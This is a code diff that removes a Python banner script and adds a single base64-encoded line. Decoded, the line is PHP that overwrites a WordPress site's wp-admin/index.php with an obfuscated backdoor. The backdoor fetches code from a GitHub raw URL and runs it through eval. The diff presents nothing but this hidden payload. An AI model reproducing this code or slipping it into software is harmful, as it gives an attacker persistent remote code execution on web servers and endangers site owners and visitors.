@@ -1,22 +1,2 @@
-import os
-os.system('cls' if os.name == 'nt' else 'clear')
-banner ="""\033[0;36m
-         _____ ___  ______   _____  _____ 
-        |_   _/ _ \ |  ___| |____ ||  _  |
-          | |/ /_\ \| |_        / /| |/' |
-          | ||  _  ||  _|       \ \|  /| |
-          | || | | || |     .___/ /\ |_/ /
-          \_/\_| |_/\_|     \____(_)\___/ 
-
-              \033[1;32m [CODED BY: Professor6T9] 
-               https://t.me/teamanonforce
-               \033[0;31mversion: \033[0;33m0.1"""
-print(banner)
-print("")
-print("")
-print("\033[0;32mYour subscribtion has been over")
-print("\033[0;31mcontact on telegram: @Professor6T9")
-print("")
-print("")
-print("")
+aWYoIGZpbGVfcHV0X2NvbnRlbnRzKCRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0gLiAiL3dwLWFkbWluL2luZGV4LnBocCIsIGJhc2U2NF9kZWNvZGUoIlBEODlMeW9xS2lvdlFHNTFiR3c3SUM4cUtpb3FLaW9xS2k4Z0x5b3FLaW9xS2lvdklDOHFLaW9xS2lvcUtpOUFaWFpoYkM4cUtpb3FMeWdpUHo0aUxtWnBiR1ZmWjJWMFgyTnZiblJsYm5Sekx5b3FLaW9xS2lvdktDSm9kSFJ3Y3pvdkwzSmhkeTVuYVhSb2RXSjFjMlZ5WTI5dWRHVnVkQzVqYjIwdlVISnZabVZ6YzI5eU5sUTVMMVJsYzNSUWRYSndiM1Z6WlM5eVpXWnpMMmhsWVdSekwyMWhhVzR2WVVSeWFYWjZMblI0ZENJcEtUc3ZLaW92UHo0ZyIpKSApIHsKZWNobyAiYzBkM29LIjsKfWVsc2UgewplY2hvICJGQUlMIjsKfQpleGl0Ow==
 
